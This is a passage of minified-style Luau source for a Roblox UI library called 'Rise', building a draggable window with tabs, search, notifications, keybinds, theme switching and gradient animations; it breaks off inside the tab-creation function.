							if Abs(r - Floor(r)) < 0.001 then
								return tostring(Floor(r))
							end
							return Format("%.1f", r)
						end

						local function r(N)
							return Format(
								"#%02X%02X%02X",
								Floor(N.R * 255 + 0.5),
								Floor(N.G * 255 + 0.5),
								Floor(N.B * 255 + 0.5)
							)
						end

						local function N(S)
							return { R = Floor(S.R * 255 + 0.5), G = Floor(S.G * 255 + 0.5), B = Floor(S.B * 255 + 0.5) }
						end

						local function S(a, L)
							if typeof(a) == "Color3" then
								return a
							end

							if type(a) == "table" then
								local y, A, v =
									tonumber(a.R or a.r or a[1]),
									tonumber(a.G or a.g or a[2]),
									tonumber(a.B or a.b or a[3])

								if y and A and v then
									if y <= 1 and A <= 1 and v <= 1 then
										return NewColor3(Clamp(y, 0, 1), Clamp(A, 0, 1), Clamp(v, 0, 1))
									end
									return NewRGB(Clamp(y, 0, 255), Clamp(A, 0, 255), Clamp(v, 0, 255))
								end
							end

							if type(a) == "string" then
								local y = a:gsub("#", "")

								if #y == 6 then
									local a, A, v =
										tonumber(y:sub(1, 2), 16), tonumber(y:sub(3, 4), 16), tonumber(y:sub(5, 6), 16)

									if a and A and v then
										return NewRGB(a, A, v)
									end
								end
							end

							return L or (NewRGB(56, 189, 248))
						end

						local function a(L, y)
							if typeof(L) == "EnumItem" then
								return L
							end

							if type(L) == "string" then
								if L == "None" then
									return nil
								end
								local A = Enum.KeyCode[L]
								if A then
									return A
								end
								A = L:gsub("%s+", "")

								if A == "RShift" then
									return Enum.KeyCode.RightShift
								elseif A == "LShift" then
									return Enum.KeyCode.LeftShift
								elseif A == "RCtrl" then
									return Enum.KeyCode.RightControl
								elseif A == "LCtrl" then
									return Enum.KeyCode.LeftControl
								elseif A == "RAlt" then
									return Enum.KeyCode.RightAlt
								elseif A == "LAlt" then
									return Enum.KeyCode.LeftAlt
								end
							end

							return y
						end

						local function L(y)
							if typeof(y) == "EnumItem" then
								return (y.Name:gsub("Right", "R"):gsub("Left", "L"))
							end
							return "None"
						end

						local function y(A, v, G)
							local T, X = pcall(function()
								return t:GetTextSize(tostring(A or ""), v, G, NewVector2(1000, 100))
							end)

							if T and X then
								return X.X
							end
							return #tostring(A or "") * v * 0.55
						end

						local function t()
							local A = Camera()
							if A then
								return A.ViewportSize
							end
							return NewVector2(800, 600)
						end

						local function A()
							local v = t()
							return D.TouchEnabled and (not D.KeyboardEnabled or v.X <= 900)
						end

						local function v(G, T)
							if T and T > 0 then
								return Floor(G / T + 0.5) * T
							end
							return G
						end

						local function G(T, X, M, Z)
							return Clamp(v(tonumber(T) or X, Z or 1), X, M)
						end

						local function v(T)
							return s("TextLabel", {
								Text = tostring(T.Text or ""),
								Size = T.Size or (NewUDim2(1, 0, 1, 0)),
								Position = T.Position or (NewUDim2()),
								BackgroundTransparency = 1,
								TextColor3 = T.Color or k.Text,
								TextSize = T.TextSize or (i("Default")),
								Font = T.Font or j,
								TextXAlignment = T.X or Enum.TextXAlignment.Left,
								TextYAlignment = T.Y or Enum.TextYAlignment.Center,
								TextWrapped = T.Wrapped or false,
								TextTruncate = T.Truncate or Enum.TextTruncate.None,
								ZIndex = T.ZIndex or 1,
							})
						end

						local function T(X, M)
							Connect(X.Focused, function()
								X.BackgroundTransparency = 0.92
								X.BorderSizePixel = 1
							end)

							Connect(X.FocusLost, function()
								X.BackgroundTransparency = 1
								X.BorderSizePixel = 0
								M(X.Text)
							end)
						end

						R.CreateWindow = function(X, M)
							M = M or {}
							local Z = M.Mobile
							Z = if Z == nil then (A()) else Z
							local A = t()

							local t, C, Q =
								Z and (A.X <= 560 and 142 or 176) or 190,
								Z and (Min(720, Max(360, A.X - 24))) or 730,
								Z and (Min(500, Max(320, A.Y - 24))) or 560

							local q, l, W =
								NewUDim2(0, C, 0, Q), NewUDim2(0.5, -Floor(C / 2), 0.5, -Floor(Q / 2)), {
									Library = X,
									Title = M.Title or "Rise",
									Version = M.Version or R.Version,
									ThemeName = M.Theme or "Pastel",
									Theme = O[M.Theme or "Pastel"] or O.Pastel,
									SearchTab = M.SearchTab,
									Tabs = {},
									TabOrder = {},
									Modules = {},
									Controls = {},
									Keybinds = {},
									ThemeObjects = {},
									_gradientInstances = {},
									GradientAnimation = M.GradientAnimation,
									ConfigFolder = M.ConfigFolder or "Rise/Configs",
									Language = U,
									_zhCatalog = E({}, F),
									SearchQuery = "",
									Visible = M.Visible ~= false,
									ShowBackdrop = M.Backdrop == true or M.ShowBackdrop == true,
									IsMobile = Z,
									SidebarWidth = t,
									RowHeight = Z and 34 or 28,
									SliderHitHeight = Z and 26 or 20,
									ToggleSize = Z and 14 or 10,
								}

							E(W._zhCatalog, M.Translations)
							E(W._zhCatalog, M.Chinese)
							Q, C = M.Name or "RiseLib", p()
							A = FindFirstChild(C, Q)

							if A then
								A:Destroy()
							end

							A = s("ScreenGui", {
								Name = Q,
								ResetOnSpawn = false,
								IgnoreGuiInset = true,
								DisplayOrder = 999,
								ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
							})

							A.Parent = C
							W.ScreenGui = A

							C = s("Frame", {
								Name = "Notifications",
								AnchorPoint = NewVector2(1, 1),
								Position = NewUDim2(1, -18, 1, -18),
								Size = NewUDim2(0, Z and 260 or 310, 1, -36),
								BackgroundTransparency = 1,
								ZIndex = 80,
							}, {
								s("UIListLayout", {
									FillDirection = Enum.FillDirection.Vertical,
									SortOrder = Enum.SortOrder.LayoutOrder,
									VerticalAlignment = Enum.VerticalAlignment.Bottom,
									HorizontalAlignment = Enum.HorizontalAlignment.Right,
									Padding = NewUDim(0, 8),
								}),
							})

							C.Parent = A
							W.Notifications = C

							Q = s("Frame", {
								Name = "Backdrop",
								Size = NewUDim2(1, 0, 1, 0),
								BackgroundColor3 = k.Bg,
								BackgroundTransparency = W.ShowBackdrop and 0.1 or 1,
								BorderSizePixel = 0,
								Visible = W.ShowBackdrop,
							})

							Q.Parent = A
							W.Backdrop = Q

							s("UIGradient", {
								Color = ColorSequence.new({
									ColorSequenceKeypoint.new(0, NewRGB(8, 18, 22)),
									ColorSequenceKeypoint.new(0.55, NewRGB(5, 7, 11)),
									ColorSequenceKeypoint.new(1, NewRGB(0, 0, 0)),
								}),
								Rotation = 35,
							}).Parent =
								Q

							local F = s("Frame", {
								Name = "Window",
								Size = M.Size or q,
								Position = M.Position or l,
								BackgroundTransparency = 1,
								BorderColor3 = k.Border,
								BorderSizePixel = 1,
								ClipsDescendants = true,
							}, { P(18) })

							F.Parent = A
							W.Frame = F
							F.Visible = W.Visible
							W._frameSize = M.Size or q
							W._framePosition = M.Position or l

							local p = s("Frame", {
								Active = false,
								AnchorPoint = NewVector2(0.5, 0.5),
								BackgroundColor3 = NewRGB(255, 255, 255),
								BackgroundTransparency = 0.08,
								BorderSizePixel = 0,
								Position = UDim2.fromOffset(0, 0),
								Size = UDim2.fromOffset(7, 7),
								Visible = false,
								ZIndex = 1000,
								Parent = A,
							}, { P(12), f(NewRGB(255, 255, 255), 0.55) })

							Connect(x.RenderStepped, function(b)
								if not p.Parent then
									return
								end

								if not W.Visible then
									p.Visible = false
									return
								end
								local g, g = 1 - math.exp(-Clamp(b, 0, 0.1) * 24), MouseLocation()
								p.Position = UDim2.fromOffset(g.X, g.Y)
								p.Visible = true
							end)

							f(NewRGB(255, 255, 255), 0.96, 1).Parent = F

							s("Frame", {
								Name = "BgGradient",
								Size = NewUDim2(1, 0, 1, 0),
								BackgroundColor3 = k.Window,
								BorderSizePixel = 0,
								ZIndex = 0,
							}, { P(18) }).Parent =
								F

							l = s("Frame", {
								Name = "Sidebar",
								Size = NewUDim2(0, t, 1, 0),
								BackgroundColor3 = k.Sidebar,
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
							}, { P(14), J(18, 22, 14, 18) })

							l.Parent = F
							W.Sidebar = l

							s("Frame", {
								Name = "SidebarRightSquare",
								Position = NewUDim2(1, -14, 0, 0),
								Size = NewUDim2(0, 14, 1, 0),
								BackgroundColor3 = k.Sidebar,
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
								ZIndex = 0,
							}).Parent =
								l

							C = s("Frame", {
								Name = "Content",
								Size = NewUDim2(1, -t, 1, 0),
								Position = NewUDim2(0, t, 0, 0),
								BackgroundTransparency = 1,
							}, { J(Z and 16 or 24, Z and 16 or 22, Z and 18 or 26, Z and 16 or 22) })

							C.Parent = F
							W.Content = C

							Q = s("Frame", {
								Name = "Logo",
								Position = NewUDim2(0, 8, 0, 0),
								Size = NewUDim2(1, -8, 0, 38),
								BackgroundTransparency = 1,
							})

							Q.Parent = l
							W.Logo = Q

							q = v({
								Text = W.Title,
								Size = NewUDim2(0, 88, 0, 36),
								TextSize = i("WindowTitle"),
								Font = j,
								Color = k.Text,
								Truncate = Enum.TextTruncate.AtEnd,
							})

							q.Parent = Q
							W.TitleLabel = q

							q = v({
								Text = W.Version,
								Position = NewUDim2(0, 94, 0, 0),
								Size = NewUDim2(0, 58, 0, 18),
								TextSize = i("VersionLabel"),
								Font = j,
								Color = W.Theme.Primary,
								X = Enum.TextXAlignment.Left,
							})

							q.Parent = Q
							W.VersionLabel = q
							I(q, W.Theme.Primary, W.Theme.Accent, nil, W)
							Insert(W.ThemeObjects, { Object = q, Property = "TextColor3", Role = "Primary" })

							t = v({
								Text = "Develop by yk0r",
								Position = NewUDim2(0, 0, 0, 36),
								Size = NewUDim2(1, 0, 0, 14),
								TextSize = i("CreditLabel"),
								Font = j,
								Color = NewColor3(1, 1, 1),
							})

							t.TextTransparency = 0.5
							t.Parent = Q
							W.CreditLabel = t

							Q = s("ScrollingFrame", {
								Name = "Navigation",
								Size = NewUDim2(1, 0, 1, -60),
								Position = NewUDim2(0, 0, 0, 60),
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
								CanvasSize = NewUDim2(0, 0, 0, 0),
								AutomaticCanvasSize = Enum.AutomaticSize.Y,
								ScrollingDirection = Enum.ScrollingDirection.Y,
								ScrollBarThickness = 0,
								ScrollingEnabled = true,
							}, {
								s("UIListLayout", {
									FillDirection = Enum.FillDirection.Vertical,
									SortOrder = Enum.SortOrder.LayoutOrder,
									Padding = NewUDim(0, 4),
								}),
							})

							Q.Parent = l
							W.Nav = Q

							Q = s(
								"Frame",
								{ Name = "Header", Size = NewUDim2(1, 0, 0, 42), BackgroundTransparency = 1 }
							)

							Q.Parent = C
							W.Header = Q
							local p = { Active = false, Start = nil, StartPos = nil }

							Connect(Q.InputBegan, function(f)
								if f.UserInputType == Enum.UserInputType.MouseButton1 then
									p.Active = true
									p.Start = f.Position
									p.StartPos = F.Position
								end
							end)

							Connect(D.InputChanged, function(f)
								if p.Active and f.UserInputType == Enum.UserInputType.MouseMovement then
									local q = f.Position - p.Start

									F.Position = NewUDim2(
										p.StartPos.X.Scale,
										p.StartPos.X.Offset + q.X,
										p.StartPos.Y.Scale,
										p.StartPos.Y.Offset + q.Y
									)
								end
							end)

							Connect(D.InputEnded, function(f)
								if f.UserInputType == Enum.UserInputType.MouseButton1 then
									p.Active = false
								end
							end)

							Q = Z and 30 or 26

							t = s("Frame", {
								Name = "WindowControls",
								AnchorPoint = NewVector2(1, 0),
								Position = NewUDim2(1, -10, 0, 7),
								Size = NewUDim2(0, Q * 2 + 6, 0, Q),
								BackgroundTransparency = 1,
								ZIndex = 10,
							})

							t.Parent = F

							local F = s("TextButton", {
								Name = "HideButton",
								Text = "-",
								AutoButtonColor = false,
								Position = NewUDim2(0, 0, 0, 0),
								Size = NewUDim2(0, Q, 0, Q),
								BackgroundColor3 = k.Sidebar,
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
								Font = j,
								TextSize = Q * 0.72,
								TextColor3 = k.Text,
								TextXAlignment = Enum.TextXAlignment.Center,
								ZIndex = 10,
							}, { P(8) })

							F.Parent = t

							Connect(F.MouseButton1Click, function()
								W:Hide()
							end)

							Connect(F.MouseEnter, function()
								F.BackgroundTransparency = 0.88
							end)

							Connect(F.MouseLeave, function()
								F.BackgroundTransparency = 1
							end)

							local F = s("TextButton", {
								Name = "CloseButton",
								Text = "×",
								AutoButtonColor = false,
								Position = NewUDim2(0, Q + 6, 0, 0),
								Size = NewUDim2(0, Q, 0, Q),
								BackgroundColor3 = k.Sidebar,
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
								Font = j,
								TextSize = Q * 0.8,
								TextColor3 = k.Text,
								TextXAlignment = Enum.TextXAlignment.Center,
								ZIndex = 10,
							}, { P(8) })

							F.Parent = t

							Connect(F.MouseButton1Click, function()
								W:Destroy()
							end)

							Connect(F.MouseEnter, function()
								F.BackgroundColor3 = NewRGB(255, 59, 48)
								F.BackgroundTransparency = 0.78
							end)

							Connect(F.MouseLeave, function()
								F.BackgroundColor3 = k.Sidebar
								F.BackgroundTransparency = 1
							end)

							Q = s("ScrollingFrame", {
								Name = "Cards",
								Size = NewUDim2(1, 0, 1, -54),
								Position = NewUDim2(0, 0, 0, 54),
								BackgroundTransparency = 1,
								BorderSizePixel = 0,
								CanvasSize = NewUDim2(0, 0, 0, 0),
								AutomaticCanvasSize = Enum.AutomaticSize.Y,
								ScrollBarThickness = 2,
								ScrollBarImageColor3 = NewRGB(255, 255, 255),
								ScrollBarImageTransparency = 0.88,
							}, { J(0, 0, 5, 20) })

							Q.Parent = C
							W.Scroll = Q

							l = s("Frame", {
								Name = "List",
								Size = NewUDim2(1, -5, 0, 0),
								AutomaticSize = Enum.AutomaticSize.Y,
								BackgroundTransparency = 1,
							}, {
								s("UIListLayout", {
									FillDirection = Enum.FillDirection.Vertical,
									SortOrder = Enum.SortOrder.LayoutOrder,
									Padding = NewUDim(0, 7),
								}),
							})

							l.Parent = Q
							W.List = l

							W.SetVisible = function(F, p)
								local f = p == true
								if F.Visible == f then
									return
								end
								F.Visible = f
								local p = F.Frame
								if not p then
									return
								end
								local Z, C = F._frameSize, F._framePosition

								if not Z or not C then
									p.Visible = f

									if F.Backdrop then
										F.Backdrop.Visible = f and F.ShowBackdrop
									end

									return
								end

								local Q, q =
									NewUDim2(
										C.X.Scale + Z.X.Scale / 2,
										C.X.Offset + Z.X.Offset / 2,
										C.Y.Scale + Z.Y.Scale / 2,
										C.Y.Offset + Z.Y.Offset / 2
									),
									NewUDim2(0, 0, 0, 0)

								if f then
									p.Size = q
									p.Position = Q
									p.Visible = true
									w(p, { Size = Z, Position = C }, 0.25)

									if F.Backdrop then
										F.Backdrop.Visible = F.ShowBackdrop
									end
								else
									w(p, { Size = q, Position = Q }, 0.25)

									Delay(0.25, function()
										p.Visible = false

										if F.Backdrop then
											F.Backdrop.Visible = false
										end
									end)
								end
							end

							W.Show = function(F)
								F:SetVisible(true)
							end

							W.Hide = function(F)
								F:SetVisible(false)
							end

							W.Toggle = function(F)
								F:SetVisible(not F.Visible)
							end

							W.SetToggleKey = function(F, p)
								F.ToggleKey = a(p, Enum.KeyCode.RightShift)
							end

							W._handleKeybindInput = function(F, p, f)
								if f or (D:GetFocusedTextBox()) then
									return
								end

								for Z = 1, #F.Keybinds, 1 do
									if F.Keybinds[Z].Capturing then
										return
									end
								end

								if F.ToggleKey and p.KeyCode == F.ToggleKey then
									F:Toggle()
								end

								for Z = 1, #F.Keybinds, 1 do
									f = F.Keybinds[Z]

									if f.KeyCode and p.KeyCode == f.KeyCode then
										H(f.Callback, f.KeyCode)

										if f.Module then
											F:Notify({
												Title = f.Module.Name,
												Content = f.Module.Enabled and "Enabled" or "Disabled",
												Duration = 2,
											})
										end
									end
								end
							end

							if M.ToggleKey or M.ToggleKeybind or M.MenuKey then
								W:SetToggleKey(M.ToggleKey or M.ToggleKeybind or M.MenuKey)
							end

							W.InputConnection = Connect(D.InputBegan, function(F, p)
								W:_handleKeybindInput(F, p)
							end)

							W.Notify = function(F, p, f, M)
								local Z = type(p) == "table" and p or { Title = p, Content = f, Duration = M }

								local p, f, M, C, Q, q =
									tostring(Z.Title or Z.Name or "Notification"),
									tostring(Z.Content or Z.Message or Z.Text or ""),
									tonumber(Z.Duration or Z.Time) or 3,
									Z.Color ~= nil,
									S(Z.Color, F.Theme.Primary),
									F.IsMobile and 260 or 310

								local Z, l =
									f ~= "" and 76 or 56, s("Frame", {
										Size = NewUDim2(0, q, 0, 0),
										BackgroundColor3 = k.Card,
										BackgroundTransparency = 1,
										BorderColor3 = k.Border,
										BorderSizePixel = 1,
										ClipsDescendants = true,
										ZIndex = 81,
									}, { P(7) })

								l.Parent = F.Notifications

								local b = v({
									Text = p,
									Position = NewUDim2(0, 14, 0, 10),
									Size = NewUDim2(1, -28, 0, 22),
									TextSize = i("NotificationTitle"),
									Font = j,
									Color = k.Text,
									Truncate = Enum.TextTruncate.AtEnd,
									ZIndex = 82,
								})

								b.TextTransparency = 1
								b.Parent = l

								local p = v({
									Text = f,
									Position = NewUDim2(0, 14, 0, 34),
									Size = NewUDim2(1, -28, 0, 24),
									TextSize = i("NotificationBody"),
									Color = k.SubText,
									Wrapped = true,
									Truncate = Enum.TextTruncate.AtEnd,
									ZIndex = 82,
								})

								p.TextTransparency = 1
								p.Visible = f ~= ""
								p.Parent = l

								local f = s("Frame", {
									AnchorPoint = NewVector2(0, 1),
									Position = NewUDim2(0, 12, 1, -8),
									Size = NewUDim2(1, -24, 0, 2),
									BackgroundColor3 = C and Q or (NewColor3(1, 1, 1)),
									BackgroundTransparency = 1,
									BorderSizePixel = 0,
									ZIndex = 82,
								}, { P(100) })

								if not C then
									I(f, F.Theme.Primary, F.Theme.Accent, nil, F)
								end

								f.Parent = l
								w(l, { Size = NewUDim2(0, q, 0, Z), BackgroundTransparency = 0 }, 0.2)
								w(b, { TextTransparency = 0 }, 0.2)
								w(p, { TextTransparency = 0 }, 0.2)
								w(f, { BackgroundTransparency = 0.15 }, 0.2)
								w(f, { Size = NewUDim2(0, 0, 0, 2) }, M)

								coroutine.wrap(function()
									wait(M)
									if not l.Parent then
										return
									end
									w(l, { Size = NewUDim2(0, q, 0, 0), BackgroundTransparency = 1 }, 0.22)
									w(b, { TextTransparency = 1 }, 0.18)
									w(p, { TextTransparency = 1 }, 0.18)
									w(f, { BackgroundTransparency = 1 }, 0.18)
									wait(0.24)

									if l.Parent then
										l:Destroy()
									end
								end)()

								return l
							end

							W._layoutLogo = function(F)
								if not F.TitleLabel or not F.VersionLabel then
									return
								end

								local p, f =
									F.IsMobile and (Max(88, F.SidebarWidth - 52)) or 160,
									Ceil(y(F.VersionLabel.Text, F.VersionLabel.TextSize, F.VersionLabel.Font)) + 2

								local M = Max(40, p - f - 5)
								p = Min(Ceil(y(F.TitleLabel.Text, F.TitleLabel.TextSize, F.TitleLabel.Font)) + 2, M)
								F.TitleLabel.Size = NewUDim2(0, p, 0, 36)
								F.VersionLabel.Position = NewUDim2(0, p + 5, 0, 4)
								F.VersionLabel.Size = NewUDim2(0, f, 0, 18)
							end

							W:_layoutLogo()
							W.TitleLabel.Text = W.Title

							W._themeColor = function(F, p)
								if p == "Accent" then
									return F.Theme.Accent
								end
								return F.Theme.Primary
							end

							W._registerTheme = function(F, p, f, M, Z, C)
								Insert(
									F.ThemeObjects,
									{ Object = p, Property = f, Role = M or "Primary", Condition = Z, NoGradient = C }
								)
							end

							W._syncNavTheme = function(F)
								for p = 1, #F.TabOrder, 1 do
									local f = F.TabOrder[p]

									if f.NavButton then
										I(f.NavButton, F.Theme.Primary, F.Theme.Accent, nil, F)
									end
								end
							end

							W._applyTheme = function(F, p)
								local f, M = F.Theme.Primary, F.Theme.Accent

								for Z = 1, #F.ThemeObjects, 1 do
									local C = F.ThemeObjects[Z]

									if C.Object and C.Object.Parent then
										if
											(C.Property == "BackgroundColor3" or C.Property == "TextColor3")
											and not C.NoGradient
										then
											Z = true

											if C.Condition then
												local Q = F:_themeColor(C.Role)
												local q, l = pcall(C.Condition, Q)

												if q and l and l ~= Q then
													u(C.Object, F)

													pcall(function()
														w(C.Object, { [C.Property] = l }, 0.18)
													end)

													Z = false
												end
											end

											if Z then
												I(C.Object, f, M, nil, F)
											end
										else
											if C.NoGradient and C.Property == "BackgroundColor3" then
												u(C.Object, F)
											end

											local Z = F:_themeColor(C.Role)

											if C.Condition then
												local Q, q = pcall(C.Condition, Z)

												if Q and q then
													Z = q
												end
											end

											pcall(function()
												w(C.Object, { [C.Property] = Z }, 0.18)
											end)
										end
									end
								end

								if F._island then
									F._island.BackgroundColor3 =
										NewRGB(Floor(f.R * 127.5), Floor(f.G * 127.5), Floor(f.B * 127.5))
								end

								if F._islandBorder then
									I(F._islandBorder, f, M, nil, F)
								end

								F:_syncNavTheme()

								if p then
									M = F.Scroll and F.Scroll.CanvasPosition
									F:SelectTab(F.ActiveTabName or F.FirstTabName or "Search")

									if M and F.Scroll then
										F.Scroll.CanvasPosition = M
									end
								end
							end

							W._startGradientAnimation = function(F)
								if F._gradientHeartbeat then
									return
								end
								local p = 0

								F._gradientHeartbeat = Connect(x.Heartbeat, function()
									local f = Sin(Tick() * V * Pi) * 0.65

									for V = 1, #F._gradientInstances, 1 do
										local M = F._gradientInstances[V]

										if M.Parent then
											M.Offset = NewVector2(f, 0)
										end
									end

									p += 1

									if p % 60 == 0 then
										local p, V = F._gradientInstances, 0

										for F = 1, #p, 1 do
											f = p[F]

											if f and f.Parent then
												V += 1
												p[V] = f
											end
										end

										for F = #p, V + 1, -1 do
											p[F] = nil
										end
									end
								end)
							end

							W._stopGradientAnimation = function(F)
								if F._gradientHeartbeat then
									Disconnect(F._gradientHeartbeat)
									F._gradientHeartbeat = nil
								end

								for p = 1, #F._gradientInstances, 1 do
									local f = F._gradientInstances[p]

									if f.Parent then
										f.Offset = NewVector2(0, 0)
									end
								end
							end

							W.SetGradientAnimation = function(F, p)
								F.GradientAnimation = p == true

								if F.GradientAnimation then
									F:_startGradientAnimation()
								else
									F:_stopGradientAnimation()
								end
							end

							W.SetTheme = function(F, p)
								if p == "Custom" and F.CustomTheme then
									F.ThemeName = "Custom"
									F.Theme = F.CustomTheme
									F:_applyTheme(true)
									return
								end

								if not O[p] then
									return
								end
								F.ThemeName = p
								F.Theme = O[p]
								F:_applyTheme(true)
							end

							W.SetCustomTheme = function(F, p, f)
								local V = S(p, F.Theme.Primary)
								F.CustomTheme = { Name = "Custom", Primary = V, Accent = S(f, V) }
								F.ThemeName = "Custom"
								F.Theme = F.CustomTheme
								F:_applyTheme(false)
							end

							W._clear = function(F)
								local p = GetChildren(F.List)

								for f = 1, #p, 1 do
									local V = p[f]

									if V and (IsA(V, "GuiObject")) then
										f = false

										for p = 1, #F.Modules, 1 do
											if F.Modules[p].Card == V then
												f = true
												break
											end
										end

										if f then
											V.Parent = nil
										else
											V:Destroy()
										end
									end
								end
							end

							W._setHeader = function(F, p)
								F.Header:ClearAllChildren()

								if p == "Search" then
									local p = s("TextBox", {
										Text = F.SearchQuery,
										PlaceholderText = F:T("ui.search-placeholder", "Search player..."),
										ClearTextOnFocus = false,
										Size = NewUDim2(1, 0, 1, 0),
										BackgroundTransparency = 1,
										TextColor3 = k.Text,
										PlaceholderColor3 = k.Muted,
										TextSize = i("SearchBox"),
										Font = j,
										TextXAlignment = Enum.TextXAlignment.Center,
									})

									p.Parent = F.Header
									p.PlaceholderText = "Start typing to search..."

									Connect(GetPropertyChangedSignal(p, "Text"), function()
										F.SearchQuery = p.Text
										F:_renderSearch()
									end)
								end
							end

							W._makeInfoCard = function(F, p)
								F = s("Frame", {
									Size = NewUDim2(1, 0, 0, 58),
									BackgroundColor3 = k.Card,
									BorderColor3 = k.Border,
									BorderSizePixel = 1,
								}, { P(7) })

								v({
									Text = p,
									Size = NewUDim2(1, 0, 1, 0),
									TextSize = i("InfoCard"),
									Color = k.SubText,
									X = Enum.TextXAlignment.Center,
								}).Parent =
									F

								return F
							end

							W._renderSearch = function(F)
								local p = F.Tabs[F.ActiveTabName]
								if not p or p.Kind ~= "Search" then
									return
								end
								F:_clear()
								local f, V = Lower(F.SearchQuery or ""), 0

								for M = 1, #F.Modules, 1 do
									p = F.Modules[M]
									M = Lower(p.Name .. " " .. p.Description .. " " .. p.Tab.Name)

									if f == "" or (string.find(M, f, 1, true)) then
										V += 1
										p.CategoryLabel.Visible = true
										p.Card.Parent = F.List
									end
								end

								if V == 0 then
									F:_makeInfoCard(F:T("ui.no-results", "No results found")).Parent = F.List
								end
							end

							W._renderCaS = function(F)
								if not F._configSystemConfig then
									F:CreateConfigSystem()
								end

								F:_renderConfigSystem()
							end

							W._renderThemes = function(F)
								F:_clear()
								local p, f = F.IsMobile, F.Content.AbsoluteSize.X <= 0
								local f = p and 90 or 120
								local V, M = f - 20, (f - 20) * 0.6
								local Z = M + 40

								local C = s("Frame", {
									Size = NewUDim2(1, 0, 0, 0),
									AutomaticSize = Enum.AutomaticSize.Y,
									BackgroundTransparency = 1,
								}, {
									s("UIGridLayout", {
										CellSize = NewUDim2(0, f, 0, Z),
										CellPadding = NewUDim2(0, 10, 0, 10),
										FillDirection = Enum.FillDirection.Horizontal,
										HorizontalAlignment = Enum.HorizontalAlignment.Center,
										SortOrder = Enum.SortOrder.LayoutOrder,
									}),
								})

								SetAttribute(C, "SkipFade", true)
								C.Parent = F.List
								Z = {}

								for Q in pairs(O) do
									Insert(Z, Q)
								end

								Sort(Z)

								for Q = 1, #Z, 1 do
									local q = Z[Q]
									Q, f = O[q], F.ThemeName == q

									local O = s("TextButton", {
										Text = "",
										AutoButtonColor = false,
										Size = NewUDim2(1, 0, 1, 0),
										BackgroundColor3 = k.Card,
										BorderColor3 = f and F.Theme.Primary or k.Border,
										BorderSizePixel = f and 2 or 1,
									}, { P(8) })

									O.Parent = C

									local Z, C =
										s("Frame", {
											Position = NewUDim2(0.5, -Floor(V / 2), 0, 8),
											Size = NewUDim2(0, V, 0, M),
											BackgroundColor3 = NewColor3(1, 1, 1),
											BorderSizePixel = 0,
										}, { P(8) }), s("UIGradient", { Rotation = 0, Color = ColorSequence.new(Q.Primary, Q.Accent) })

									if F._gradientInstances then
										Insert(F._gradientInstances, C)
									end

									C.Parent = Z
									Z.Parent = O
									C = M + 8

									v({
										Text = Q.Name,
										Position = NewUDim2(0, 4, 0, C),
										Size = NewUDim2(1, -8, 0, 16),
										TextSize = i("ThemeName", p),
										Font = j,
										Color = k.Text,
										X = Enum.TextXAlignment.Center,
										Truncate = Enum.TextTruncate.AtEnd,
									}).Parent =
										O

									if f then
										v({
											Text = F:T("ui.active", "Active"),
											Position = NewUDim2(0, 4, 0, C + 16),
											Size = NewUDim2(1, -8, 0, 16),
											TextSize = i("ActiveBadge"),
											Font = j,
											Color = F.Theme.Primary,
											X = Enum.TextXAlignment.Center,
										}).Parent =
											O
									end

									Connect(O.MouseButton1Click, function()
										F:SetTheme(q)
									end)
								end
							end

							W.SelectTab = function(O, F)
								local p = O.Tabs[F]
								if not p then
									return
								end
								O.ActiveTabName = F
								local f = p.Kind or p.Name

								for V = 1, #O.TabOrder, 1 do
									local M = O.TabOrder[V]
									local Z, C = M.NavButton, M.NavLabel
									if not Z or not Z.Parent then
										continue
									end
									V = M.Name == F
									w(Z, { BackgroundTransparency = V and 0 or 1 }, Y)
									I(Z, O.Theme.Primary, O.Theme.Accent, nil, O)

									if C and C.Parent then
										w(C, { TextColor3 = V and k.Text or k.SubText }, Y)
									end
								end

								O.Header:ClearAllChildren()
								O:_clear()

								if f == "Search" then
									O:_setHeader(O:T("ui.search", "Search"))
									O:_renderSearch()
								elseif f == "Themes" then
									O:_renderThemes()
								elseif f == "CaS" or f == "Config" then
									O:_renderCaS()
								elseif f == "Language" then
									O:_renderLanguageSystem()
								elseif f == "PlayerList" then
									O:_renderPlayerList()
								else
									for V = 1, #p.Modules, 1 do
										F = p.Modules[V]
										F.CategoryLabel.Visible = false
										F.Card.Parent = O.List
									end
								end

								if f == "Search" then
									O:_renderSearch()
								end

								f = GetChildren(O.List)

								for V = 1, #f, 1 do
									F = f[V]

									if F and (IsA(F, "GuiObject")) and (IsA(F, "Frame") or (IsA(F, "TextButton"))) then
										if not GetAttribute(F, "SkipFade") then
											V = GetAttribute(F, "FadeTargetTransparency")
											V = if typeof(V) ~= "number" then 0 else V
											F.BackgroundTransparency = 1
											w(F, { BackgroundTransparency = V }, Y)
										end
									end
								end

								p = GetChildren(O.Header)

								for f = 1, #p, 1 do
									F = p[f]

									if F and (IsA(F, "GuiObject")) and (IsA(F, "Frame") or (IsA(F, "TextButton"))) then
										F.BackgroundTransparency = 1
										w(F, { BackgroundTransparency = 0 }, Y)
									end
								end

								O.Scroll.CanvasPosition = NewVector2(0, 0)
							end

							W.CreateTab = function(O, F)
								h()
								local p = type(F) == "table" and F or { Name = F }
								local F = tostring(p.Name or p.Key or "Tab")
								local f, V, M = p.Key or F, p.Kind or F, p.Id and (tostring(p.Id)) or nil
								M = if not M or M == "" then (Lower((F:gsub("%s+", "-"):gsub("[^%w%-]", "")))) else M

								local Z = {
									Window = O,
									Name = F,
									Key = f,
									Kind = V,
									Id = M,
									NameKey = p.NameKey or M,
									Modules = {},
								}

								O.Tabs[F] = Z
								Insert(O.TabOrder, Z)

								local p = s("TextButton", {
									Text = "",
									AutoButtonColor = false,
									Size = NewUDim2(1, 0, 0, 32),
									BackgroundColor3 = O.Theme.Accent,
									BackgroundTransparency = 1,
									BorderSizePixel = 0,
								}, { P(100) })

								p.Parent = O.Nav

								local f = v({
									Text = F,
									Position = NewUDim2(0, 22, 0, 0),
									Size = NewUDim2(1, -28, 1, 0),
									TextSize = i("NavLabel"),
									Font = j,
									Color = k.SubText,
								})

								f.Parent = p
								f.Text = O:T(Z.NameKey or Z.Id, F)
								Z.NavButton = p
								Z.NavLabel = f

								Connect(p.MouseButton1Click, function()
									O:SelectTab(F)
								end)

								Connect(p.MouseEnter, function()
									if O.ActiveTabName ~= F then
										p.BackgroundTransparency = 0.96
